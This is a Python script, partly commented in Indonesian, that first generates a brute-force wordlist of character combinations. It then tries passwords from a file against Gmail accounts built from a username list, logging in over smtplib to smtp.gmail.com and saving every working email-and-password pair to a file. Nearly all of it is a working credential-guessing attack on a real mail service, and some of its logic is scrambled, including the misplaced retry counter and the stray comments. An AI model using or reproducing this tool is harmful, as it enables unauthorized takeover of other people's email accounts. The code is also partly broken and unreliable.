```python
import smtplib
import itertools
import string
alphabet = input("Enter the alphabet range (a-z, 0-9): ")  # Get input for alphabet range
length = int(input("Enter the length of permutations: "))  # Get input for permutation length
import time

    # ...
   # Menunda 1 detik antara percobaan
# Validate the alphabet input
valid_chars = string.ascii_lowercase + string.digits
if any(char not in valid_chars for char in alphabet):
    print("Invalid alphabet range. Please enter a valid range (a-z, 0-9).")
else:
    # Generate permutations
    permutations = itertools.product(alphabet, repeat=length)

    # Create and open the output file in write mode
    output_file = "output.txt"
    with open(output_file, "w") as f:
        for combination in permutations:
            # Join the characters and write to the file
            f.write("".join(combination) + "\n")

    print(f"Permutations of length {length} saved to {output_file}")
import smtplib

def login(email, password):
    try:
        attempts = 0
        while attempts < 3:  # Coba maksimal 3 kali
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.ehlo()
            server.login(email, password)
            server.quit()
            return True

    except smtplib.SMTPAuthenticationError:
        return False
    except Exception as e:
        print(f"An error occurred: {e}")

        attempts += 1
        return False
def main():
    password_file = input('Enter path to password file: ')
    user_list_file = input('Enter path to user list file: ')

    output_file = "output-mail.txt"  # Output file for successful login attempts

    try:
        with open(user_list_file, 'r') as user_file:
            userlist1 = [line.strip() for line in user_file.readlines()]
            # Construct email addresses by appending '@gmail.com' to each username
            userlist = [f"{username}@gmail.com" for username in userlist1]

        with open(password_file, 'r') as pass_file:
            passwords = [line.strip() for line in pass_file.readlines()]

        with open(output_file, "w") as output:
            for email in userlist:
                print(f"Target email: {email}")

                for idx, password in enumerate(passwords, start=1):
                    password = password.strip()
                    print(f'Trying password {idx}/{len(passwords)}')
                    time.sleep(1)
                    if login(email, password):
                        success_message = f'Success! {email} Password found: {password}\n'
                        print(success_message)
                        output.write(success_message)
                        break
                    else:
                        print(f'Password {password} not found.')

    except FileNotFoundError as e:
        print(f'Error: {e}')

if __name__ == '__main__':
    main()
```
